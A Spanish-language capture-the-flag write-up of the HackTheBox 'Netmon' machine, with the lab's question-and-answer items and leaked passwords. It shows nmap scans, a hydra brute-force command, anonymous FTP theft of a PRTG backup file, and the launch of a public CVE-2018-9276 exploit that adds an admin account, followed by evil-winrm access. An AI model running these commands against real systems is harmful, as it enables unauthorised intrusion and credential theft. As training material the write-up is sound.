1)¿Cuál es el nombre de la aplicación que se ejecuta en el puerto 80? Dadas las tres palabras del logotipo.
	PRTG Network Monitor

2)¿Qué servicio se ejecuta en el puerto TCP 21?
	ftp

*La pregunta anterior es la flag de user.txt*
4)¿Cuál es la ruta completa de la carpeta donde PRTG Network Monitor guarda sus archivos de configuración por defecto?
	`C:\ProgramData\Paessler\PRTG Network Monitor`

5)¿Cuál es el nombre del archivo de configuración de copia de seguridad?
	PRTG Configuration.old.bak

6)¿Cuál era la contraseña del usuario prtgadmin según ese archivo?
	PrTg@dmin2018

7)¿Cuál es ahora la contraseña del usuario prtgadmin en el sitio web?
	PrTg@dmin2019

8)¿Qué versión de PRTG está instalada?
	18.1.37.13946

9)¿Con qué usuario se ejecuta este software por defecto? No incluya nada antes de un \
	system
	tasklist /v | findstr PRTG                        [[findstr]] [[tasklist]]
	![[Netmon17.png]]




--------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.10.152
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.152 -oG allPorts
extractPorts allPorts
nmap -sCV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -oN target
```

![[Netmon1.png]]
![[Netmon2.png]]
![[Netmon3.png]]
![[Netmon4.png]]
![[Netmon5.png]]
*TTL:* Maquina windows
*Puertos Relevantes:*
	`21` [[ftp]]
	`80` HTTP
	`445` [[smb]]
	`47001 o 5985` Alguno de estos dos puertos puede llegar  tener un [[evil-winrm]]
*Datos importantes*
En el servicio de [[ftp]] nos podemos conectar como el usuario anonymous. Y en [[smb]] con el usuario guest


----
# [[Enumeracion con pequeño script de NMAP y Whatweb-wappalyzer]]

```shell
whatweb http://10.10.10.152
```

![[Netmon6.png]]

No nos da ningun dato relevante, tambien intente enumerar directorios con [[FFUF]] y no me dio ningun resultado

---------
# [[Hydra]]

Vamos a intentar sacar por fuerza bruta las credenciales
![[Netmon14.png]]

```
hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt 10.10.10.152 http-post-form '/public/checklogin.htm:username=^USER^&password=^PASS^:F=Your login has failed. Please try again !' -t 64
```

![[Netmon10.png]]

![[Netmon9.png]]
Nos tira muchos falsos positivos, por que tarda en la respuesta, así que no podemos sacar credenciales con fuerza bruta

-------
# Intrusion por [[ftp]] user anonymnous

```shell
ftp 10.10.10.152 -p 21
```

![[Netmon7.png]]
![[Netmon8.png]]
Y sacamos la primera flag en el directorio */users/public/desktop/user.txt*

Ahora vamos al directorio por defecto donde se guardan los backups de PRTG Network Monitor
*/ProgramData/paessler/PRTG Network Monitor*

![[Netmon12.png]]
Vemos al archivo de bakcup y lo descargamos `get PRTG Configuration.old.ba`

Lo abrimos en nuestra maquina, tiene un contenido muy extenso, pero la informacion relevante es esta en las lineas 141 y 142. Nos otorga las credenciales *prtgadmin:PrTg@dmin2018*

![[Netmon13.png]]


------

# [[CVE-2018-9276]]

Buscamos vulnerabilidades con [[searchsploit]] con el comando ``searchsploit prtg``
![[Netmon19.png]]
Descargamos la siguiente ``searchsploit  -m windows/webapps/46527.sh``
Le damos permiso de ejecucion con `chmod +x 46527.sh` y luego lo ejecutamos

La cookie de sesion la ponemos con el parametro *-c* y la sacamos de la pagina donde ya estamos logeado con las credenciales que sacamos previamente en `http://10.10.10.152/welcome.htm`, pero cambiando la contraseña a *PrTg@dmin2019*
![[Netmon20.png]]
```
./46527.sh -u http://10.10.10.152 -c "OCTOPUS1813713946=e0FDMjQ3RTg0LTc0MzEtNDUyNy1BNzU2LTI0MTZEM0ExM0YwMX0%3D"

```
![[Netmon15.png]]
Este exploit lo que hace es crear un nuevo usuario en el windows, con permisos de administrador, y las credenciales van a ser pentest:P3nT3st!

## Conexion a la maquina con [[evil-winrm]]
Nos conectamos con esta herramienta por que habiamos visto en el escaneo de nmap que estaba activo el servicio por el puerto 47001
Y ya podemos catear la flag
```
evil-winrm -i 10.10.10.152 -u pentest -p 'P3nT3st!'
```

![[Netmon16.png]]

----------
# Notas
Si una contraseña tiene un año antiguo, probar cambiar la contraseña al año actual, por ejemplo. Si la contraseña dice admin2018, y estamos en el 2019, probar admin2019

---------
# Creditos
[Proyecto github A1vinSmith](https://github.com/A1vinSmith/CVE-2018-9276) Me guio un poco en la parte del CVE